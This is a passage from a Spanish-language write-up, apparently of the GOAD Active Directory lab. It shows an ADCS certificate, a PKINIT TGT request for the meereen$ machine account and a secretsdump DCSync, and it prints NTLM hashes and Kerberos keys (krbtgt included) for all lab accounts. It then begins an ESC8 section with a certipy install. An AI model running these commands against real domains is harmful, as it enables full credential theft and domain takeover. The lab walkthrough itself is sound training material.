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
```

En este punto, se procede a guardar el certificado en un archivo que puede nombrarse "cert.b64" u otro nombre de preferencia.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cat cert.b64 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: cert.b64
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ MIIRbQIBAzCCEScGCSqGSIb3DQEHAaCCERgEghEUMIIREDCCB0cGCSqGSIb3DQEHBqCCBzgwggc0AgEAMIIHLQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIpr6GqdzSqpcCAggAgIIHAO65cZ96NE
       │ y+xFEXc2EWyLc+04UoWU/kv+jnXczGfjpKjmcYcDOZ1o3vEy+hSAPidZJs36PPLZbWe/zbyKaFwSF5zKRzm9a2Jbi8K1Q3BRSUAJnmuVV0DdkGaaDgxVbhEyNkRsmxFEyeFGwEgrQ02ZlYy265HOILn50F
       │ EFYgzgIzU2VGquyNlgmyBvv6dRFxUUNCIcimSBJJUuD3CslOpRsVRMMyhlSdw4FG0JoyvdT5EGaipA41HW7e/TifIfc+rfz+kxl6zpy2DO/HCI2TSkWvnk3Vl+MunoHrlbmicSILYX3vjf6vxooRy3XMt8
       │ XWEKw1+HyyGpuPyTml1q5cgvRk1MEy5X+CKG2ZAP3wrUDb13fFT/S5I0+HCKIciPi3hQFI3jrotZfM4rQ99+IyC4imRRT5giNKkmeXti0wx6oSp1LEU1nM70Inxm0jVgAyq8M9aGPRgg8jbaRkjvmqMQRn
       │ 5IXcaAr7oY4+XBy4vRaXZN2ygsW37G9ZWzoXCBBmLazFKAWpUyf9eJCHgFLzVe6xEaTQrKvQ3Gc9nk7Abd8byOqy3MaNrYqpebgfx+2p5s5ARQYETYpnUHsFCXkS5wzT9c/tLneDUsywE7uh2mkUUqWWoE
       │ lTyEBw64QnTUfuGFpVwbFESaaTRhNUf8U586HZjEZW0rNrc4rldF+ONfSSbU0LDDukCjv7mvN01WEffD38Gb2/wH+2pYjFE8zN20M0MrAmVIuQgdj4YveUC6vt4FKVnn0Uk2uAprUz4OBrjpsV5LeN9gX1
       │ BJ3D+WIYUxYRY3giTiCT1ul0XKHDFDcX+nSzy2NRowbnWw8EEbeVIlRwUkUKulvucqVDbRQoFpxNWggq76kFUV0cJpeK+whJ8ubuxrTvu7L6NmoCgh5skCc5mwnTe88godUevg90cyBZ80AsrV2R6LGvzf
       │ jexd0cJzcdMyckU5i/oPRxW5ZGM12EfIJjwBdNy5mXm/pKIwbYnfRVnfP/qlTkFHyhWtV0Ww0VXoPn1tz4B5H82eW4K+FBV32CNfk27RqayVNiNaPIbZfvtPpACnnLfvYATVjNPKcFPm4HC1w7bMuaXp8y
       │ BL1x3rN5kJw9Mut1MepIrkaPMZtmqejVueDts/vRGaYTRlLddHH5FXKVu7HnEN1V3JJn1muTTQNJgDVzT1KylU2tPOIjU00+lirpz282bTmMV7uaYHomIOqXGxUC3tHMA8pYN24vdg8usBRztJxHkDoAu4
       │ M/FE5nWwhEKoVAHOkWiOCbZr0URwCdkE09n0v6BViYOmCODefZ2DjsZ9ng+ccZDNmNNtf0QxrLELzwpUQ0Pn1+nqI5TFbonuPiCCLs/+PEQQbweB9BKAlYd2ZiRzo3yB9twNv6LgRHRC5T5ZhvCUWkPx6d
       │ dvX1OiE8Atr+AMlNl5Fa6Xpl0WII4wDjSunqChnsL0kWvOVEpDTXgtODN488lUBuyvYN13j30iHhFDbNveDdt4fAmggpgO6Jjdr1g01/fP7Q8dtFrQrsYdAGCOvHV/n/xcANs8eJh8itPya3S129SmfCYh
       │ vsvbWC9XOcEKHf0ez6FeZZvbE5oYTunP1jk6oqQY1toFejRgt3n7+8ElsalSfwmw52jmCRtPYENPtg9lY3scKxBAjKP4LD/S5qqO2fLKLN/VwYijpfDa+FQ7MgTuJSwsJV7/1XxfFfnN83uGQSb0pWR1Ci
       │ vaQ1DNf25ywuARnYEQEZ0BQtPFCLfnXLfExmCeEt/dmR2Ti0hq5rIyFJDgB/YCpITjfA5TkxV4TlF1QrGYanMH+xeZ+hedXdmXD/aq9gD1/aHn28ezNb5OUWKbuDj0gJoREaimO3ghR8EcUGhC+Qm+3KIC
       │ 4f+j/tmbqMHngCMey2tQKdCN1JAhAoPB+G/ewKS7+xAl3y9GxNarRFgl1BAFpw9BJ9jjcJ9vsqJPN6mQ0wuVMf/Cb3RblH2SA8XRq+abCHKxBfodkg94/Xe191KnidHLOAbBTCAC9v0weLKg529vPeaNYQ
       │ zzauFDToo6MZgDjtQXfvllpnYxkJdhVkB6MXwGPId7lkcidVJlH8lUU1SaHB3aB4uUenyIGSuhfxto0/umcsJITEJrE4BiwHV0DO5WExpIIsCr/J9njMs+WO5PQK7c/YU5As+DT1K7AZpOAkSvhjBfA0xI
       │ c1Xz87SFfkHS4yWIrhverBsrutvVt5AOicKBzoK3+/X1jrkMBTu7cwVDzLtA4DBfxaAAc/ustYY17G2neSidTti38C2yuEnzKdud6EYT6x+Lry7BAaoXT+sK+fJ/WWVhifKcPJUrl03KE2WzguSlsGm/t6
       │ Wri6vQ75HdamU6b6SYgB9bMH+pOmJXWn6Hoi4poDqL5pvsvhxvP1uHudHi7bXmLO34ymMa4wggnBBgkqhkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQ
       │ EMAQMwDgQI7Sbihewo3kECAggABIIJSJbbuHc9joPjcJSikRnFda8nAS0sPwsN3+ql+QTRDaZI/AglQSVg8ZVQgzDkF3qxPvwjcTKIp+8Pc6ATTHq4/azC7u4SYoFx4NQ1tIHLPp1k6Jg/GHj0snc+/Q0Y
       │ b9TttcVe9mq7rMWYVjrl9o1Eh6G5st3vrSaNzkvLxOHVHpT2oig/7zh6sgkM54tF0M/rGr0OmQs1SdwN3Gji/CnH5QVTdzAs3J0K7g71ua7UxsdQtgyM8NfdquQWNCrizHl+Lw6kS8sMg95wA4+s0A8Y8M
       │ z3fdG6Rg5bb3LIP2Dz0oWkj+DY5eof06OVWN0ZcHwQvys30LkgmoUODvqRdxiia8J8gBbSrQfiKl7K54tdYhjAMgkT5vz51tVQCPN79XLOZSVvDpA5jGQk170GmTgyjyni0L6bMcr+Bvr+voSScBhvxNfb
       │ M0mvFCzf4kVlVTOd0fEh4zTXHXiFb680PhaEgYy4ChIp5WnBcosH42CViRZGF3EbUFS2JgEtZETZgU3mVG3BnOmNLRLbCvf/UPnn+Oe7t00L0ggJj28ki2+jFRhAODnQDaLMTuGsm/DG9EUAsTFyTnE98Y
       │ Lg2S4u0J9QM0VettO6dzNLDai+X/pFiBhXwcM5GcXBa+K5S/QGAOmL0cfKQqgAetMpP17IQgvN8+bekRrtIIjELMU6Xqg3RVNXabM5iW/kYkNqLr0/hEQ72NMEe3BObKfn655hS2ujmMpUn0qpWwfbrFXF
       │ Mrl1qACtDuextThFZKGbfVXCj1SaEl4j2NA/hna5ELGP1rF+glEQHXTtfgNPQ/2txlfAqz/McKYrCCiFMpOJ4+b/hdXvLGMufRX9Yv04LtFO6bwfZY04k+VCiRg4HKJYZivgdoAgWMo9xqtg7j6oLwEPkM
       │ IOGgHIzd7No84vF9UIrxNVvk3/nl14xHlPz9uyFvK+xNVLT1T2HC7MjfvQm0C4eLKdUierAYeinYpocPMPsHvYUrkrHxhmrDBw3qUdTYpKIyX1B+psYT/1aI1ucruxCAKpOd4l9gnXrsheY9kAWgbstvh9
       │ H93jhT8ZhAKLyK2NWEZQ4OpTKyJtn5xCVWUBtRKmSfVZyjSku9DAkz/ig49cuZn3J3W6WxzyOfHRJvV0hYX+xahb7bGBCT1WDTgO1tMYQMQOSHG8Lgrr3bnmPg5W3RTQL5LwKkKob2Jo7hrlq6xTZPCCq1
       │ TNU408Ayx6QVqeCHvsf3U1KjZPSw1ZretUz/kg2YKA3e35BjaQ/zWJmZyWLQszQBOepoLkh0RTbtGKGNbVKsiGZbqTnl3F/ZTPAc+C7xvDqKFcsoMiRlKpUAVUzgcKXwikCqk4b5vhQB/zKv1T0E7s5mnK
       │ NjQIWdW5EsUVg2ylPdZhDK8gR0vr7Zj/0UGRv+4h0h16VFVNRYxR0nTMG6l5kf1BgWluhaA+8f+a+AVC6QXrsFDOXIyvQ0eFJefqMqiYjP/HQvy6Eep/l6CGFHGDvjPR3FDy7u9zdEBY3BDKWtHZ51MgQf
       │ 1ecs5fzcbs5c0o7eBwuiXytx4mH5xUeo30+zQq+w9ebAWeVl3xUWBCm7/JjWUFeSQXA+1RKxfEw8IeS+IMrNmljkPhSe4R+4sUDFv4BZ/UzsD9Di8W06JZMOFYOl93gUME92yFp36wiXswxS9wqtKxXGNS
       │ H77GiP46fBfdSbV8a8yCk65RlCr03K60xWWrNCnMLkdV1CLWuBZikpkS5FkGGr+GgV2j1xbxwr7adVrCY8oDYsGTcb5o8TZ+9dTmzIVATyDD/JRfYS+8g1ByUHsQRp22Wh2bDvr8LKOIhf21AuXpcAkfUH
       │ Pc9pjFrPHyM20ReWWy3s44HAQRWB0/6XGKorerwesZcyX5KiBNExBQ2OCnz4wGFR8DBvjvtDPFbG8corC9z6wlpBp9Ej9rKcWShbWx7X5ARFApGG9V8oq632+GZYlVWp+r20FiyomafOKxlZPEx82eav9j
       │ F7MgMyP+2r+CoQIiKQQk5yvyHX1k8Vr/HnBEq/bH43/FpTcZGzNh7vdot1/hRF3KqHjk0Rlq3PY1dwA0fv+HEPZNbd/N8jUat2frpc8fFSnpBLm8p7FDGhI8Yns7dMiAirQRNaZ7RlexUfSIWvpOJyd2Ac
       │ +fxiwWrvWzKbRCSNJ1/cHlOpBADoovx0TJkYOCm/1lQFKpteabn/h00OCDtTnOx2qdSXY7+OKJKFfqkShneqVB8sZKkQTEwMpdR7Jql0/P8EpMxa9SKog1f63IlhYsUceGlc4Lg2VekfIACzvGs3uJfnqk
       │ 0TeCI49eutKCEtlDpGnHqbEuhnM6RyJpqco0fHROrf/KQXwRnJMPv6v0clSf5IqF9zods+u9cK0cEsjW3uWw2whCE5Fmir1ixw65rtbSk25Fugqy4fo9OpwOgOmz9IBUxBoKnfOB4vtMG2h4LnufoTO+RF
       │ 17RPA+U6Dk5E3cilw6dq9OchsiSgZyjRB7qvxmEZPe2T7Y4ygaLNy4FcJ5xLvBhMzvWuKKU3y5Y652jy/67w1q1Kiw6LSlZYNFZ9Ez3SymQYKbwmhDTGPVx0DjyFt3jbX0oFKJrK3WwlQ14BDlCCeRvV+V
       │ 2QvWKV3hWBpJFYjALw8mQDadur82Qimm5pZ1quHC8iLvBg8o/8QxeL8f5r5cjH7GLf9CuLbZQxf5TojMBe1E5Sz+gSM80ko1f59Yd0mng8S1C08M1QUtqGtKMMtxwulrzqqwRxdSY8heJufKV7HaD1xsJi
       │ PLUOzB4XgxwAGdPh5FP1xKkoVfuySQY1iXUGs1+k4rhjS4ejDYyHwrNzMcHAA5YCRT9qd/4zvbT6htjPaVo4k69NP6syvIQFP+u8v830D9vsJaBlepMkFpeqjFmpvl+lnYRP14hea7aW7xEQzeGYio0QSA
       │ 6q6nCVOGt7dsoRxZHv6C7i+fCGEIus/vUXcAYXD2qt66TjQsRAxqcrXW2vS8m31Z4MZBuiWarUSrTF9kAMbIZ8WEIHQC/OOnaSL7aN3qYDVcdlpVmT1CTcJAzvDvvxGRAo+LxLFg58iFGZ9Zwgl/Z1DHrP
       │ K2eQoKWnu/lfchF315+RA+LCC/u3jYP0mcLoKpWar6DZb+/4BsEIWy11nKHgT+LE66lt93mFJDGZsGKHEQSz89dC9JDpPU20ZtaswsiDMGFAwFEneNPYKj0TElMCMGCSqGSIb3DQEJFTEWBBRcgmwuNIzq
       │ AXVdafpRRSusQInVxTA9MDEwDQYJYIZIAWUDBAIBBQAEIKZhAhwUwC8nUM2phrFGdV2TS61zBME7znvdJ31ehKsbBAhSpV+63wLLCQ==
   2   │ 
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Se solicitará un TGT utilizando la herramienta [gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py){:target="_blank"} Esto se realizará con el siguiente comando: `gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'`

```csharp
┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'
2023-08-26 19:53:09,911 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-08-26 19:53:10,488 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-08-26 19:53:22,259 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-08-26 19:53:22,259 minikerberos INFO     c276093b3139097619ba8b4d40222e77f81403be720ce5e3356491d65a048b87
INFO:minikerberos:c276093b3139097619ba8b4d40222e77f81403be720ce5e3356491d65a048b87
2023-08-26 19:53:22,267 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

A continuación, se exportará este ticket para llevar a cabo el proceso de DCsync y obtener todo el contenido de NTDS.dit.

confirmar el ticket 

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ll meereen.ccache 
Permissions Size User        Date Modified Name
.rwxrwxrwx  1,4k angussmoody 26 ago 19:53  meereen.ccache
```

Luego, procedemos a exportar el ticket utilizando el comando `export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache
```

Con los pasos anteriores completados, se procede a ejecutar el DCsync mediante el siguiente comando:`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
Impacket v0.11.0 - Copyright 2023 Fortra

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b50102c4722c9481fc31747a0d0c336a:::
BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:1360f96a3845a2385b97d98f6fefa033:::
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:d8cdf6de89cfc88ea30464747fb8500f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b46977016f518d492039b32b58925cf9b4192ea145fe2b1d0c2e40e44df021f9
krbtgt:aes128-cts-hmac-sha1-96:d2ecac8e0dd5c4b0190c3dde4ad0862c
krbtgt:des-cbc-md5:c8a708384cefa12f
daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
khal.drogo:des-cbc-md5:b5ec4c1032ef020d
jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
jorah.mormont:des-cbc-md5:b926916289464ffb
sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
sql_svc:des-cbc-md5:91d6b0df31b52a3d
angussmoody:aes256-cts-hmac-sha1-96:da6575ba99aeed92d15fbfe9b23a1c4e8b5c46b9c5db9da8c672f619200d1880
angussmoody:aes128-cts-hmac-sha1-96:7e3cf40500816ea8b445cbd9e25d1ea1
angussmoody:des-cbc-md5:43a4ec689b58fe38
MEEREEN$:aes256-cts-hmac-sha1-96:ad23285a83e260adbd2aed490c76294ed7de3caafd191da9f97590e98b0d1dda
MEEREEN$:aes128-cts-hmac-sha1-96:3401d711a4ffc14bde85aa5438f59ab4
MEEREEN$:des-cbc-md5:b3f1a1f2618667c8
BRAAVOS$:aes256-cts-hmac-sha1-96:8b7984362695ea881eb2fd82dee4b186614db5d181abe80ed6db606b6844ed43
BRAAVOS$:aes128-cts-hmac-sha1-96:631f3578b29fa024d17d679fb3fbe2a5
BRAAVOS$:des-cbc-md5:1af7750262dfb046
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:5a48434fe32d2ccead3abe27f87ac46cb528f42fc2d9af1050b48f325b4d3937
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:3464c356265d6a44d426722c061b56c9
SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
[*] Cleaning up...
```

---

## ESC8 - con certipy

En primer lugar, se instala la herramienta [certipy](https://github.com/ly4k/Certipy){:target="_blank"} utilizando el comando: `pip3 install certipy-ad`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #pip3 install certipy-ad
Collecting certipy-ad
  Downloading certipy_ad-4.7.0-py3-none-any.whl (129 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 129.9/129.9 kB 4.2 MB/s eta 0:00:00
Requirement already satisfied: ldap3 in /usr/lib/python3/dist-packages (from certipy-ad) (2.8.1)
Requirement already satisfied: dsinternals in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (1.2.4)
Requirement already satisfied: unicrypto in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (0.0.10)
Collecting pyopenssl>=23.0.0
  Using cached pyOpenSSL-23.2.0-py3-none-any.whl (59 kB)
Requirement already satisfied: impacket in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (0.11.0)
Collecting pycryptodome
  Downloading pycryptodome-3.18.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 MB 15.8 MB/s eta 0:00:00
Requirement already satisfied: pyasn1==0.4.8 in /usr/lib/python3/dist-packages (from certipy-ad) (0.4.8)
Requirement already satisfied: requests-ntlm in /usr/lib/python3/dist-packages (from certipy-ad) (1.1.0)
Requirement already satisfied: dnspython in /usr/lib/python3/dist-packages (from certipy-ad) (2.0.0)
Collecting cryptography>=39.0
  Downloading cryptography-41.0.3-cp37-abi3-manylinux_2_28_x86_64.whl (4.3 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.3/4.3 MB 14.9 MB/s eta 0:00:00
Requirement already satisfied: asn1crypto in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (1.5.1)
Requirement already satisfied: requests in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (2.28.1)
Requirement already satisfied: cffi>=1.12 in /usr/lib/python3/dist-packages (from cryptography>=39.0->certipy-ad) (1.14.5)
Requirement already satisfied: six in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (1.16.0)
Requirement already satisfied: pycryptodomex in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (3.9.7)
Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (2.0.1)
Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (0.18.2)
Requirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (0.9.3)
Requirement already satisfied: charset-normalizer in /usr/local/lib/python3.9/dist-packages (from impacket->certipy-ad) (2.1.1)
Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests->certipy-ad) (2.10)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests->certipy-ad) (2022.9.24)
Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/lib/python3/dist-packages (from requests->certipy-ad) (1.26.5)
Installing collected packages: pycryptodome, cryptography, pyopenssl, certipy-ad
  Attempting uninstall: cryptography
    Found existing installation: cryptography 38.0.1
    Uninstalling cryptography-38.0.1:
      Successfully uninstalled cryptography-38.0.1
  Attempting uninstall: pyopenssl
    Found existing installation: pyOpenSSL 22.1.0
    Uninstalling pyOpenSSL-22.1.0:
      Successfully uninstalled pyOpenSSL-22.1.0
Successfully installed certipy-ad-4.7.0 cryptography-41.0.3 pycryptodome-3.18.0 pyopenssl-23.2.0
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
--- Logging error ---
Traceback (most recent call last):
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/logging.py", line 177, in emit
    self.console.print(renderable, overflow="ignore", crop=False, style=style)
  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/console.py", line 1673, in print
    extend(render(renderable, render_options))
  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/console.py", line 1305, in render
    for render_output in iter_render:
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/logging.py", line 134, in __rich_console__
    for line in lines:
  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/segment.py", line 249, in split_lines
    for segment in segments:
  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/console.py", line 1283, in render
    renderable = rich_cast(renderable)
  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/protocol.py", line 36, in rich_cast
    renderable = cast_method()
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/self_outdated_check.py", line 130, in __rich__
    pip_cmd = get_best_invocation_for_this_pip()
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/entrypoints.py", line 58, in get_best_invocation_for_this_pip
    if found_executable and os.path.samefile(
  File "/usr/lib/python3.9/genericpath.py", line 101, in samefile
    s2 = os.stat(f2)
FileNotFoundError: [Errno 2] No existe el fichero o el directorio: '/usr/bin/pip'
Call stack:
  File "/usr/local/bin/pip3", line 8, in <module>
    sys.exit(main())
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/main.py", line 70, in main
    return command.main(cmd_args)
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/base_command.py", line 101, in main
    return self._main(args)
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/base_command.py", line 223, in _main
    self.handle_pip_version_check(options)
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/req_command.py", line 190, in handle_pip_version_check
    pip_self_version_check(session, options)
  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/self_outdated_check.py", line 236, in pip_self_version_check
    logger.warning("[present-rich] %s", upgrade_prompt)
  File "/usr/lib/python3.9/logging/__init__.py", line 1454, in warning
    self._log(WARNING, msg, args, **kwargs)
  File "/usr/lib/python3.9/logging/__init__.py", line 1585, in _log
    self.handle(record)
  File "/usr/lib/python3.9/logging/__init__.py", line 1595, in handle
    self.callHandlers(record)
  File "/usr/lib/python3.9/logging/__init__.py", line 1657, in callHandlers
    hdlr.handle(record)
  File "/usr/lib/python3.9/logging/__init__.py", line 948, in handle
    self.emit(record)
